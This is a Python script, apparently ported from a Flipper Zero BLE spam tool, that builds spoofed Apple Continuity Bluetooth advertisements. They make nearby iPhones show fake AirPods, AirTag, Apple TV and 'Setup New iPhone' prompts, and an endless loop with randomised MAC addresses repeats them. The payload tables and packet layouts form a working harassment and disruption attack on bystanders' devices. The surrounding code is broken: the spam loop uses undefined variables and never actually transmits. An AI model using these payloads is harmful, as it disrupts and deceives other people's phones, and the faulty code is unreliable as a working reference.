# Apple Continuity payloads (ported from Flipper apple_ble_spam - WillyJL/ECTO-1A/furiousMAC).
# EXTEND: add (prefix, model, "Name") to PROX  or  (flags, type, "Name") to NACT.
#   prefix 0x01 = AirPods/Beats family,  0x05 = AirTag.   Nearby-Action flags usually 0xC0.
import random
import time

# Proximity Pair: shows the AirPods/Beats/AirTag "connect" card.
PROX = [
    (0x01, 0x0220, "AirPods"),        (0x01, 0x0f20, "AirPods 2"),
    (0x01, 0x1320, "AirPods 3"),      (0x01, 0x0e20, "AirPods Pro"),
    (0x01, 0x1420, "AirPods Pro 2"),  (0x01, 0x0a20, "AirPods Max"),
    (0x01, 0x0320, "Powerbeats 3"),   (0x01, 0x0b20, "Powerbeats Pro"),
    (0x01, 0x0c20, "Beats Solo Pro"), (0x01, 0x1120, "Beats Studio Buds"),
    (0x01, 0x1620, "Beats Studio Buds+"), (0x01, 0x0520, "Beats X"),
    (0x01, 0x0620, "Beats Solo 3"),   (0x01, 0x0920, "Beats Studio 3"),
    (0x01, 0x1720, "Beats Studio Pro"), (0x01, 0x1220, "Beats Fit Pro"),
    (0x01, 0x1020, "Beats Flex"),
    (0x05, 0x0055, "AirTag"),         (0x05, 0x0030, "Hermes AirTag"),
]
# Nearby Action: the full-screen MODAL prompts (need lock/unlock between repeats on iOS).
NACT = [
    (0xc0, 0x09, "Setup New iPhone"), (0xc0, 0x02, "Transfer Number"),
    (0xc0, 0x0b, "HomePod Setup"),    (0xc0, 0x01, "Setup New AppleTV"),
    (0xc0, 0x06, "Pair AppleTV"),     (0xc0, 0x0d, "HomeKit AppleTV"),
    (0xc0, 0x2b, "AppleID for AppleTV"), (0xc0, 0x13, "AppleTV AutoFill"),
    (0xc0, 0x27, "AppleTV Connecting"), (0xbf, 0x20, "Join This AppleTV"),
    (0xc0, 0x19, "AppleTV Audio Sync"), (0xc0, 0x1e, "AppleTV Color Balance"),
    (0x40, 0x09, "Setup New (glitch)"),
]

def _rb(n):
    return bytes([random.randint(0, 255) for _ in range(n)])

def random_mac():
    mac = [0x00, 0x1A, 0x7D] + [random.randint(0, 255) for _ in range(3)]
    return ':'.join(f'{byte:02X}' for byte in mac)

def random_packet():
    if random.random() < 0.5:
        pre, m, name = random.choice(PROX)
        adv = bytes([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, pre, (m >> 8) & 0xff, m & 0xff, 0x55]) + _rb(21)
    else:
        fl, t, name = random.choice(NACT)
        adv = bytes([0x0a, 0xff, 0x4c, 0x00, 0x0f, 0x05, fl, t]) + _rb(3)
    return ('Apple/' + name, adv)

def find_device():
    # Placeholder function to simulate finding a device
    print("Finding nearby Apple device...")
    time.sleep(2)  # Simulate delay
    return 'AirPods Pro'

def spam_packets(device_name):
    while True:
        packet = random_packet()
        mac = random_mac()
        adv = bytes([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, pre, (m >> 8) & 0xff, m & 0xff, 0x55]) + _rb(21)
        adv += bytes([0x03, 0x03] + [int(x, 16) for x in mac.split(':')])
        print(f"Spamming {device_name} with {packet[0]} on MAC {mac}")
        time.sleep(1)  # Simulate delay

if __name__ == "__main__":
    device = find_device()
    spam_packets(device)
